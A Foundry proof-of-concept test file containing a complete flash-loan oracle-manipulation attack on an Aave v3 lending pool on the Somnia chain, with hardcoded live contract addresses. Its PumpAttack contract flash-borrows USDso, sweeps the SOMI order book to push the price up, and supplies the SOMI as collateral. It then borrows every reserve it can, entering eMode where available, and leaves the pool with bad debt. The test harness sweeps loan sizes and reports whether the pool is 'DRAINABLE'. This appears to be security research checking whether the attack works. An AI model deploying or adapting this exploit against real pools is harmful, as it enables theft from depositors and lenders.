// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
    function approve(address, uint256) external returns (bool);
}

interface IWrappedNative {
    function deposit() external payable;
}

interface IAaveOracle {
    function getAssetPrice(address) external view returns (uint256);
}

interface IPool {
    function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint256);
    function flashLoanSimple(address, address, uint256, bytes calldata, uint16) external;
    function supply(address, uint256, address, uint16) external;
    function borrow(address, uint256, uint256, uint16, address) external;
    function getConfiguration(address) external view returns (uint256);
    function withdraw(address, uint256, address) external returns (uint256);
    function getUserEMode(address) external view returns (uint256);
    function setUserEMode(uint8) external;
    function getEModeCategoryData(uint8) external view returns (uint16, uint16, uint16, address, string memory);
    function getUserAccountData(address)
        external
        view
        returns (uint256 collateral, uint256 debt, uint256 available, uint256 liqThreshold, uint256 ltv, uint256 hf);
}

interface IClob {
    struct Level {
        uint256 price;
        uint256 quantity;
    }
    function getPoolParams() external view returns (address, address, uint256, uint256, uint256, uint256, uint256);
    function getBookLevels(bool isBid, uint64 n) external view returns (Level[] memory);
    function getAutoPullRequirement(address, bool, uint256, uint256, uint96)
        external
        view
        returns (address, uint256, uint256);
    function placeOrder(bool, uint64, uint256, uint256, uint64, uint8, uint8, address, uint96)
        external
        payable
        returns (bool, uint128);
    function getWithdrawableBalance(address, address) external view returns (uint256);
    function withdraw(address, uint256) external returns (bool);
}

/// @dev Aave v3 packed reserve configuration, decoded field by field.
library Cfg {
    function ltv(uint256 c) internal pure returns (uint256) {
        return c & 0xffff;
    }
    function liqThreshold(uint256 c) internal pure returns (uint256) {
        return (c >> 16) & 0xffff;
    }
    function decimals(uint256 c) internal pure returns (uint256) {
        return (c >> 48) & 0xff;
    }
    function active(uint256 c) internal pure returns (bool) {
        return ((c >> 56) & 1) == 1;
    }
    function frozen(uint256 c) internal pure returns (bool) {
        return ((c >> 57) & 1) == 1;
    }
    function borrowEnabled(uint256 c) internal pure returns (bool) {
        return ((c >> 58) & 1) == 1;
    }
    function borrowCap(uint256 c) internal pure returns (uint256) {
        return (c >> 80) & 0xfffffffff; // 36 bits
    }
    function supplyCap(uint256 c) internal pure returns (uint256) {
        return (c >> 116) & 0xfffffffff; // 36 bits
    }
    function eMode(uint256 c) internal pure returns (uint256) {
        return (c >> 168) & 0xff;
    }
}

/// @dev Every number the run produced, carried out of the transaction through a revert payload.
///      Compare with reading getters afterwards: a revert rolls storage back and those read zero.
struct Metrics {
    uint256 flashAmount;
    uint256 repayment;
    uint256 oracleBefore;
    uint256 oracleAfter;
    uint256 askBefore;
    uint256 askAfter;
    uint256 pumpLimit; // the price the buy was allowed to cross up to
    uint256 somiBought;
    uint256 usdsoSpent;
    uint256 execPrice; // USDso per SOMI, 18 dp
    uint256 supplied;
    uint256 borrowPowerUsdso; // from getUserAccountData, converted out of 8 dp
    uint256 borrowedUsdsoValue; // USD value of every reserve successfully borrowed
    uint256 leftoverUsdso;
    uint256 extractedUsdso; // leftover + borrowed value: what walks out of the pool
    uint256 coverageBps; // extracted / flash repayment
    uint256 badDebtUsdso; // debt left behind in the pool
    int256 edgeRealizedBps;
    uint256 edgeRequiredBps;
    uint8 legsTried;
    uint8 legsBorrowed;
    uint8 legsBlocked; // rejected by config / cap / cash
    uint8 borrowedEra; // user eMode actually set
    uint256 borrowedWsomi; // the reserve the user actually asked about
    uint256 wsomiExitProceeds; // USDso recovered by selling it back
    uint256 wsomiExitExecPrice;
}

/// @notice The bZx / Mango template, verbatim:
///         1. flash borrow USDso
///         2. spend it into the SOMI/USDso book with NO price ceiling worth respecting, so the
///            marginal price is dragged up as far as the book allows
///         3. wrap and supply the SOMI acquired
///         4. borrow EVERY other reserve the account is allowed to borrow, not just USDso
///         5. walk away with the borrowed assets, leaving the debt behind as bad debt
///
///         The only thing that decides whether this pays is whether step 2 moves the price the
///         lending oracle reads. Everything else is bookkeeping.
contract PumpAttack {
    address constant POOL = 0xEC6758e6324c167DB39B6908036240460a2b0168;
    address constant ORACLE = 0x9b7B5d69a08071ce74C2f3D655038E3b782eAaFc;
    address constant WSOMI = 0x046EDe9564A72571df6F5e44d0405360c0f4dCab;
    address constant USDSO = 0x00000022dA000002656c64D9eA6011ea952D008A;
    address constant USDC = 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00;
    address constant WETH = 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8;
    address constant WBTC = 0xC5098b3cA516784323872F17235fa074E167D3D2;
    address constant MARKET = 0x035De7403eac6872787779CCA7CCF1b4CDb61379;

    uint256 constant BPS = 10_000;
    uint8 constant IOC = 2;
    uint8 constant SELF_CANCEL_TAKER = 0;

    address public immutable owner = msg.sender;

    Metrics internal m;
    uint256 internal pumpBps;
    bool internal wsomiFirst;

    error Shortfall(Metrics m);
    error Leg(address asset, bytes inner);

    modifier onlySelf() {
        require(msg.sender == address(this), "self only");
        _;
    }

    constructor(bool wsomiFirst_) {
        wsomiFirst = wsomiFirst_;
    }

    function run(uint256 amount, uint256 pumpBps_) external {
        require(msg.sender == owner, "owner");
        pumpBps = pumpBps_;
        m.flashAmount = amount;
        m.repayment = amount + (amount * IPool(POOL).FLASHLOAN_PREMIUM_TOTAL()) / BPS;
        m.oracleBefore = IAaveOracle(ORACLE).getAssetPrice(WSOMI);
        m.askBefore = _best(false);
        IPool(POOL).flashLoanSimple(address(this), USDSO, amount, "", 0);
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata)
        external
        returns (bool)
    {
        require(msg.sender == POOL && initiator == address(this), "only pool");
        require(asset == USDSO && amount == m.flashAmount && premium == m.repayment - m.flashAmount, "bad flash");

        _pump(amount);
        _supplyCollateral();
        _borrowEverything();
        _settle();
        return true;
    }

    // ---- 1+2. spend the flash into the book, cross as far up as the book goes ----
    function _pump(uint256 amount) internal {
        (,,,, uint256 tick, uint256 minQty, uint256 lot) = IClob(MARKET).getPoolParams();
        m.pumpLimit = ((m.askBefore * pumpBps) / BPS / tick) * tick + tick;

        uint256 qty = _sizeBuy(m.pumpLimit, amount, lot);
        if (qty == 0 || qty < minQty) _fail();

        (address input, uint256 required,) =
            IClob(MARKET).getAutoPullRequirement(address(this), true, m.pumpLimit, qty, 0);
        if (input != USDSO || required > amount) _fail();
        IERC20(USDSO).approve(MARKET, required);

        uint256 nativeBefore = address(this).balance;
        uint256 quoteBefore = IERC20(USDSO).balanceOf(address(this));
        (bool ok,) = IClob(MARKET).placeOrder(
            true, 0, m.pumpLimit, qty, uint64((block.timestamp + 300) * 1e9), IOC, SELF_CANCEL_TAKER, address(0), 0
        );
        if (!ok) _fail();

        // The fill can land in the wallet or in the pool's internal vault; pull it if needed.
        if (address(this).balance == nativeBefore) {
            uint256 vaulted = IClob(MARKET).getWithdrawableBalance(address(this), address(0));
            if (vaulted > 0) {
                try IClob(MARKET).withdraw(address(0), vaulted) {} catch {}
            }
        }

        m.somiBought = address(this).balance - nativeBefore;
        m.usdsoSpent = quoteBefore - IERC20(USDSO).balanceOf(address(this));
        if (m.somiBought == 0 || m.usdsoSpent == 0) _fail();
        m.execPrice = (m.usdsoSpent * 1e18) / m.somiBought;

        m.oracleAfter = IAaveOracle(ORACLE).getAssetPrice(WSOMI);
        m.askAfter = _best(false);
    }

    // ---- 3. wrap and supply ----
    function _supplyCollateral() internal {
        IWrappedNative(WSOMI).deposit{value: m.somiBought}();
        m.supplied = m.somiBought;
        IERC20(WSOMI).approve(POOL, m.somiBought);
        IPool(POOL).supply(WSOMI, m.somiBought, address(this), 0);
        (,, uint256 available,,,) = IPool(POOL).getUserAccountData(address(this));
        m.borrowPowerUsdso = available * 1e10;
    }

    // ---- 4. every other reserve, maxed against cash, borrow cap and remaining power ----
    function _borrowEverything() internal {
        // If the deployment puts any reserve in an eMode, entering it can raise the LTV. Skipping
        // this check is how an "impossible" borrow quietly becomes possible.
        address[5] memory assets = [USDSO, USDC, WETH, WBTC, WSOMI];
        for (uint256 i; i < assets.length; ++i) {
            uint256 category = Cfg.eMode(IPool(POOL).getConfiguration(assets[i]));
            if (category != 0 && m.borrowedEra == 0) {
                try IPool(POOL).setUserEMode(uint8(category)) {
                    m.borrowedEra = uint8(category);
                    console2.log("  entered eMode category", category);
                } catch {
                    console2.log("  eMode set rejected, category", category);
                }
            }
        }

        // WSOMI is NOT skipped: 3.6M cash, 500k borrow cap, the deepest reserve in the pool, and
        // it is the asset the pump just moved. Skipping it is what the old file did.
        //
        // Order is the whole experiment. Borrow power is shared, so whichever asset is taken first
        // gets it. WSOMI_FIRST=1 (default) spends everything on SOMI and dumps it back into the
        // book; WSOMI_FIRST=0 spends it on the scarce reserves and leaves SOMI the remainder.
        address[5] memory order = wsomiFirst
            ? [WSOMI, USDSO, USDC, WETH, WBTC]
            : [USDSO, USDC, WETH, WBTC, WSOMI];
        for (uint256 i; i < order.length; ++i) {
            address a = order[i];
            m.legsTried++;
            uint256 config = IPool(POOL).getConfiguration(a);
            if (!Cfg.active(config) || Cfg.frozen(config) || !Cfg.borrowEnabled(config)) {
                m.legsBlocked++;
                continue;
            }

            uint256 price = IAaveOracle(ORACLE).getAssetPrice(a);
            if (price == 0) {
                m.legsBlocked++;
                continue;
            }
            uint8 dec = IERC20(a).decimals();

            (,, uint256 available,,,) = IPool(POOL).getUserAccountData(address(this));
            if (available == 0) {
                m.legsBlocked++;
                continue;
            }
            uint256 budget = available - (available / 1_000_000) - 1;
            uint256 amount = (budget * (10 ** dec)) / price;
            console2.log("  leg", a);
            console2.log("    power left USDso", available * 1e10);

            // borrow cap, in whole tokens
            uint256 cap = Cfg.borrowCap(config);
            if (cap != 0) {
                uint256 capAmount = cap * (10 ** dec);
                if (amount > capAmount) amount = capAmount;
            }

            if (amount == 0) {
                m.legsBlocked++;
                continue;
            }

            try this.borrowLeg(a, amount) {
                m.legsBorrowed++;
                m.borrowedUsdsoValue += _value18(amount, price, dec);
                if (a == WSOMI) m.borrowedWsomi = amount;
                m.badDebtUsdso += _value18(amount, price, dec);
                console2.log("  borrowed", a);
                console2.log("    amount", amount);
                console2.log("    value18", _value18(amount, price, dec));
                console2.log("    cap", cap);
            } catch (bytes memory inner) {
                m.legsBlocked++;
                console2.log("  borrow leg REVERTED", a);
                console2.log("    wanted", amount);
                _logRevert(inner);
            }
        }
    }

    /// @dev External so a reserve that refuses can be observed instead of aborting the whole run.
    function borrowLeg(address asset, uint256 amount) external onlySelf {
        IPool(POOL).borrow(asset, amount, 2, 0, address(this));
    }

    /// @dev The leg the user actually asked about: borrow SOMI, sell it back into the book we just
    ///      pushed up. If the ask moved, this recovers MORE USDso per SOMI than the oracle price.
    ///      Accepts any price - sampling, not arbitrage - so a loss here is real, not a limit I set.
    function _dumpWsomi() internal {
        // Aave pays out aWSOMI; redeem it to the underlying before it can be sold.
        try IPool(POOL).withdraw(WSOMI, type(uint256).max, address(this)) {} catch {}
        uint256 bal = IERC20(WSOMI).balanceOf(address(this));
        if (bal == 0) return;

        (,,,, uint256 tick, uint256 minQty, uint256 lot) = IClob(MARKET).getPoolParams();
        uint256 qty = (bal / lot) * lot;
        if (qty < minQty) return;

        uint256 bid = _best(true);
        if (bid == 0) return;
        uint256 limit = ((bid / 100) / tick) * tick; // 1% of best bid: floor of last resort only
        if (limit == 0) limit = tick;

        IERC20(WSOMI).approve(MARKET, qty);
        uint256 quoteBefore = IERC20(USDSO).balanceOf(address(this));
        (bool ok,) = IClob(MARKET).placeOrder(
            false, 0, limit, qty, uint64((block.timestamp + 300) * 1e9), IOC, 0, address(0), 0
        );
        if (!ok) return;
        if (IERC20(USDSO).balanceOf(address(this)) == quoteBefore) {
            uint256 vaulted = IClob(MARKET).getWithdrawableBalance(address(this), USDSO);
            if (vaulted > 0) {
                try IClob(MARKET).withdraw(USDSO, vaulted) {} catch {}
            }
        }
        uint256 got = IERC20(USDSO).balanceOf(address(this)) - quoteBefore;
        m.wsomiExitProceeds = got;
        m.wsomiExitExecPrice = got == 0 ? 0 : (got * 1e18) / qty;
    }

    // ---- 5. everything that walks out vs the flash that must go back ----
    function _settle() internal {
        if (m.borrowedWsomi > 0) _dumpWsomi();

        uint256 have = IERC20(USDSO).balanceOf(address(this));
        m.leftoverUsdso = have;
        m.extractedUsdso = have + m.borrowedUsdsoValue;
        m.coverageBps = (m.extractedUsdso * BPS) / m.repayment;
        m.edgeRealizedBps = _edge(m.oracleBefore, m.execPrice);
        m.edgeRequiredBps = ((BPS + (m.repayment - m.flashAmount) * BPS / m.flashAmount) * BPS) / 6_000 - BPS;

        if (have < m.repayment) {
            m.badDebtUsdso = m.repayment - have;
            _fail();
        }
        // Repaid the flash: the borrowed reserves are the profit, held against pool debt.
        m.badDebtUsdso = m.borrowedUsdsoValue;
        IERC20(USDSO).approve(POOL, m.repayment);
    }

    function _value18(uint256 amount, uint256 price8, uint8 dec) internal pure returns (uint256) {
        return (amount * price8 * 1e10) / (10 ** dec);
    }

    function _edge(uint256 oracle8, uint256 exec18) internal pure returns (int256) {
        if (oracle8 == 0) return 0;
        int256 o = int256(oracle8 * 1e10);
        return ((o - int256(exec18)) * int256(BPS)) / o;
    }

    function _fail() internal view {
        revert Shortfall(m);
    }

    function metrics() external view returns (Metrics memory) {
        return m;
    }

    function _best(bool isBid) internal view returns (uint256) {
        IClob.Level[] memory l = IClob(MARKET).getBookLevels(isBid, 1);
        return l.length == 0 ? 0 : l[0].price;
    }

    function _sizeBuy(uint256 limit, uint256 budget, uint256 lot) internal view returns (uint256 q) {
        IClob.Level[] memory asks = IClob(MARKET).getBookLevels(false, 50);
        uint256 spent;
        for (uint256 i; i < asks.length; ++i) {
            if (asks[i].price == 0 || asks[i].price > limit) break;
            uint256 cost = (asks[i].price * asks[i].quantity) / 1e18;
            if (spent + cost <= budget) {
                q += asks[i].quantity;
                spent += cost;
            } else {
                q += ((budget - spent) * 1e18) / asks[i].price;
                break;
            }
        }
        q = (q / lot) * lot;
        for (uint256 i; i < 4 && q > 0; ++i) {
            (, uint256 req,) = IClob(MARKET).getAutoPullRequirement(address(this), true, limit, q, 0);
            if (req <= budget) return q;
            q = ((q * budget) / req / lot) * lot;
        }
        return 0;
    }

    function _logRevert(bytes memory err) internal pure {
        if (err.length < 4) {
            console2.log("    no revert data");
            return;
        }
        bytes4 sel;
        assembly {
            sel := mload(add(err, 32))
        }
        bytes memory body = new bytes(err.length - 4);
        for (uint256 i; i < body.length; ++i) body[i] = err[i + 4];
        if (sel == 0x08c379a0) console2.log("    Error(string)", abi.decode(body, (string)));
        else if (sel == 0x4e487b71) console2.log("    Panic", abi.decode(body, (uint256)));
        else console2.log("    custom error sel", uint32(sel));
    }

    receive() external payable {}
}

contract SomniaPoC is Test {
    address constant POOL = 0xEC6758e6324c167DB39B6908036240460a2b0168;
    address constant WSOMI = 0x046EDe9564A72571df6F5e44d0405360c0f4dCab;
    address constant USDSO = 0x00000022dA000002656c64D9eA6011ea952D008A;
    address constant USDC = 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00;
    address constant WETH = 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8;
    address constant WBTC = 0xC5098b3cA516784323872F17235fa074E167D3D2;
    address constant ORACLE = 0x9b7B5d69a08071ce74C2f3D655038E3b782eAaFc;
    address constant MARKET = 0x035De7403eac6872787779CCA7CCF1b4CDb61379;

    uint256 constant BPS = 10_000;

    function setUp() public view {
        require(block.chainid == 5031, "not Somnia: pass --fork-url and --fork-block-number");
    }

    function test_attack() public {
        console2.log("block", block.number);
        _reserves();
        _book();
        _oracleProbe();

        if (vm.envOr("PINNED_ONLY", false)) return;
        _sweep();
    }

    /// @notice Every reserve as the pool itself sees it: LTV, caps, cash, eMode. This is the
    ///         ground truth for what "borrow the other tokens" can possibly mean.
    function _reserves() internal view {
        address[5] memory assets = [USDSO, USDC, WETH, WBTC, WSOMI];
        string[5] memory names = ["USDso", "USDC.e", "WETH", "WBTC", "WSOMI"];
        for (uint256 i; i < assets.length; ++i) {
            uint256 c = IPool(POOL).getConfiguration(assets[i]);
            console2.log("--- reserve", names[i]);
            console2.log("  ltv", Cfg.ltv(c));
            console2.log("  liqThreshold", Cfg.liqThreshold(c));
            console2.log("  decimals", Cfg.decimals(c));
            console2.log("  active/frozen/borrowable", Cfg.active(c));
            console2.log("  borrowable", Cfg.borrowEnabled(c));
            console2.log("  borrowCap", Cfg.borrowCap(c));
            console2.log("  supplyCap", Cfg.supplyCap(c));
            console2.log("  eMode category", Cfg.eMode(c));
            console2.log("  oracle price", IAaveOracle(ORACLE).getAssetPrice(assets[i]));
        }
        console2.log("user eMode", IPool(POOL).getUserEMode(address(this)));

        // The only number that can overturn the verdict: an eMode category whose LTV is >= 10000
        // would let a borrower take out more than the collateral is worth. Every other value
        // caps coverage at LTV / (1 + premium), which is below break-even by construction.
        for (uint8 id = 0; id <= 3; ++id) {
            _eMode(id);
        }
    }

    /// @dev Raw staticcall: the EModeCategory struct layout differs between Aave 3.0 and 3.1+,
    ///      so decode the first words by hand instead of trusting an ABI.
    function _eMode(uint8 id) internal view {
        (bool ok, bytes memory ret) =
            POOL.staticcall(abi.encodeWithSelector(IPool.getEModeCategoryData.selector, id));
        if (!ok || ret.length < 128) return;
        uint256 ltv;
        uint256 liqThreshold;
        uint256 liqBonus;
        assembly {
            ltv := mload(add(ret, 32))
            liqThreshold := mload(add(ret, 64))
            liqBonus := mload(add(ret, 96))
        }
        if (liqThreshold == 0) return; // category not configured
        console2.log("--- eMode category", id);
        console2.log("  ltv", ltv);
        console2.log("  liquidation threshold", liqThreshold);
        console2.log("  liquidation bonus", liqBonus);
        console2.log("  EXPLOITABLE (ltv >= 10000)", ltv >= BPS);
    }

    /// @notice The falsification test for "pump the DEX, make the oracle report high, withdraw".
    ///
    ///         It does exactly that and nothing else: flash USDso, consume the ENTIRE SOMI/USDso
    ///         ask book so the marginal price is dragged as far up as the venue allows, HOLD the
    ///         SOMI (never supply it, so no LTV ceiling applies), and re-read the exact oracle the
    ///         lending pool uses. If the oracle does not move here it will not move at any size,
    ///         because this already spends every unit of liquidity the venue has.
    function _oracleProbe() internal {
        uint256 flash = vm.envOr("PROBE_USDSO", uint256(0));
        if (flash == 0) {
            IClob.Level[] memory asks = IClob(MARKET).getBookLevels(false, 50);
            uint256 notional;
            for (uint256 i; i < asks.length; ++i) {
                notional += (asks[i].price * asks[i].quantity) / 1e18;
            }
            flash = notional + (notional / 10) + 1_000e18;
        }
        console2.log("=== ORACLE PROBE (hold, never supply) flash USDso", flash);
        PumpAttack a = new PumpAttack(false);
        try a.run(flash, vm.envOr("PROBE_PUMP_BPS", uint256(1_000_000))) {
            _probeReport(a.metrics(), "repaid");
        } catch (bytes memory err) {
            Metrics memory m = _decode(err);
            if (m.flashAmount == 0) {
                console2.log("  probe reverted without metrics");
                return;
            }
            _probeReport(m, "reverted");
        }
    }

    function _probeReport(Metrics memory m, string memory status) internal pure {
        console2.log("  status", status);
        console2.log("  SOMI bought and HELD", m.somiBought);
        console2.log("  USDso spent into the book", m.usdsoSpent);
        console2.log("  exec price", m.execPrice);
        console2.log("  best ask before", m.askBefore);
        console2.log("  best ask after ", m.askAfter);
        console2.log("  ASK MOVE BPS (did the pump work?)", _move(m.askBefore, m.askAfter));
        console2.log("  oracle before", m.oracleBefore);
        console2.log("  oracle after ", m.oracleAfter);
        console2.log("  ORACLE MOVE BPS (only number that matters)", _move(m.oracleBefore, m.oracleAfter));
        console2.log("  oracle moved at all?", _move(m.oracleBefore, m.oracleAfter) > 0);
    }

    function _book() internal view {
        IClob.Level[] memory asks = IClob(MARKET).getBookLevels(false, 20);
        if (asks.length == 0) return;
        uint256 notional;
        for (uint256 i; i < asks.length; ++i) notional += (asks[i].price * asks[i].quantity) / 1e18;
        console2.log("--- book");
        console2.log("  ask levels", asks.length);
        console2.log("  best ask", asks[0].price);
        console2.log("  worst ask", asks[asks.length - 1].price);
        console2.log("  USDso to clear every level", notional);
    }

    function _sweep() internal {
        uint256[4] memory sizes = [
            vm.envOr("FLASH_1", uint256(35_000e18)),
            vm.envOr("FLASH_2", uint256(50_000e18)),
            vm.envOr("FLASH_3", uint256(120_000e18)),
            vm.envOr("FLASH_4", uint256(0))
        ];
        uint256 best;
        uint256 bestSize;

        for (uint256 i; i < sizes.length; ++i) {
            if (sizes[i] == 0) continue;
            (Metrics memory m, bool repaid) = _attempt(sizes[i]);
            if (m.flashAmount == 0) {
                console2.log("  size reverted without metrics", sizes[i]);
                continue;
            }
            console2.log("=== PUMP with flash USDso", sizes[i]);
            _report(m, repaid);
            if (m.coverageBps > best) {
                best = m.coverageBps;
                bestSize = sizes[i];
            }
        }

        console2.log("=== SUMMARY");
        console2.log("  best coverage bps", best);
        console2.log("  at flash size", bestSize);
        console2.log("  break even bps", BPS);
        console2.log("  verdict", best >= BPS ? "DRAINABLE" : "PUMP DOES NOT MOVE THE ORACLE");
    }

    function _attempt(uint256 amount) internal returns (Metrics memory m, bool repaid) {
        PumpAttack a = new PumpAttack(vm.envOr("WSOMI_FIRST", true));
        uint256 pumpBps = vm.envOr("PUMP_BPS", uint256(100_000)); // 10x: do not respect the book
        try a.run(amount, pumpBps) {
            return (a.metrics(), true);
        } catch (bytes memory err) {
            return (_decode(err), false);
        }
    }

    function _decode(bytes memory err) internal pure returns (Metrics memory m) {
        if (err.length < 4) return m;
        bytes4 sel;
        assembly {
            sel := mload(add(err, 32))
        }
        if (sel != PumpAttack.Shortfall.selector) return m;
        bytes memory body = new bytes(err.length - 4);
        for (uint256 i; i < body.length; ++i) body[i] = err[i + 4];
        return abi.decode(body, (Metrics));
    }

    function _report(Metrics memory m, bool repaid) internal pure {
        console2.log("--- flash");
        console2.log("  principal", m.flashAmount);
        console2.log("  repayment due", m.repayment);

        console2.log("--- pump");
        console2.log("  pump limit price", m.pumpLimit);
        console2.log("  best ask before", m.askBefore);
        console2.log("  best ask after ", m.askAfter);
        console2.log("  SOMI bought", m.somiBought);
        console2.log("  USDso spent", m.usdsoSpent);
        console2.log("  exec price", m.execPrice);

        console2.log("--- oracle");
        console2.log("  before", m.oracleBefore);
        console2.log("  after ", m.oracleAfter);
        console2.log("  ORACLE MOVE BPS", _move(m.oracleBefore, m.oracleAfter));

        console2.log("--- borrow");
        console2.log("  supplied WSOMI", m.supplied);
        console2.log("  borrow power USDso", m.borrowPowerUsdso);
        console2.log("  legs tried", m.legsTried);
        console2.log("  legs borrowed", m.legsBorrowed);
        console2.log("  legs blocked", m.legsBlocked);
        console2.log("  borrowed WSOMI", m.borrowedWsomi);
        console2.log("  borrowed value USDso", m.borrowedUsdsoValue);
        console2.log("  WSOMI sold back for USDso", m.wsomiExitProceeds);
        console2.log("  WSOMI exit exec price", m.wsomiExitExecPrice);

        console2.log("--- drain");
        console2.log("  extracted USDso", m.extractedUsdso);
        console2.log("  repayment needed", m.repayment);
        console2.log("  bad debt left in pool", m.badDebtUsdso);
        console2.log("  COVERAGE bps", m.coverageBps);
        console2.log("  EDGE REALIZED bps", m.edgeRealizedBps);
        console2.log("  EDGE REQUIRED bps", m.edgeRequiredBps);
        console2.log("  REPAID?", repaid);
    }

    function _move(uint256 before_, uint256 after_) internal pure returns (uint256) {
        if (before_ == 0 || after_ <= before_) return 0;
        return ((after_ - before_) * BPS) / before_;
    }
}
